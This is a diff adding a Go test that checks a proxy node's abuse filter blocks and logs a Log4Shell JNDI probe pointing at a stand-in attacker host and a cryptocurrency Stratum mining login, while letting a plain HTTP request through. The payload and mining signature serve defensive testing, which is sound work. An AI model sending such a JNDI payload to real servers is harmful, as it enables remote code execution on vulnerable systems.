@@ -222,6 +222,27 @@ func TestAbuseBruteForceBans(t *testing.T) {
 	eventually(t, 5*time.Second, "brute force detect log", detectLogged(panel, 1, 25))
 }
 
+func TestAbuseSignaturesRefuse(t *testing.T) {
+	tcpEcho, _ := startEcho(t)
+	panel, dialer, _ := startAbuseNode(t, &option.AbuseOptions{
+		Exploits: option.AbuseCheckOptions{RuleID: 26},
+		Mining:   option.AbuseCheckOptions{RuleID: 27},
+	})
+	echo := M.ParseSocksaddrHostPort("127.0.0.1", uint16(tcpEcho))
+	if echoes(dialer, echo, []byte("GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1\r\nHost: target\r\n\r\n")) {
+		t.Fatal("Log4Shell probe got through")
+	}
+	if echoes(dialer, echo, []byte(`{"id":1,"method":"mining.subscribe","params":["cgminer/4.12.1"]}`+"\n")) {
+		t.Fatal("Stratum login got through")
+	}
+	if !echoes(dialer, echo, []byte("GET /index.html?v=${version} HTTP/1.1\r\nHost: example\r\n\r\n")) {
+		t.Fatal("a plain HTTP request was refused")
+	}
+	eventually(t, 5*time.Second, "exploit and mining detect logs", func() bool {
+		return detectLogged(panel, 1, 26)() && detectLogged(panel, 1, 27)()
+	})
+}
+
 func TestAbuseDisabled(t *testing.T) {
 	tcpEcho, _ := startEcho(t)
 	_, dialer, _ := startAbuseNode(t, &option.AbuseOptions{
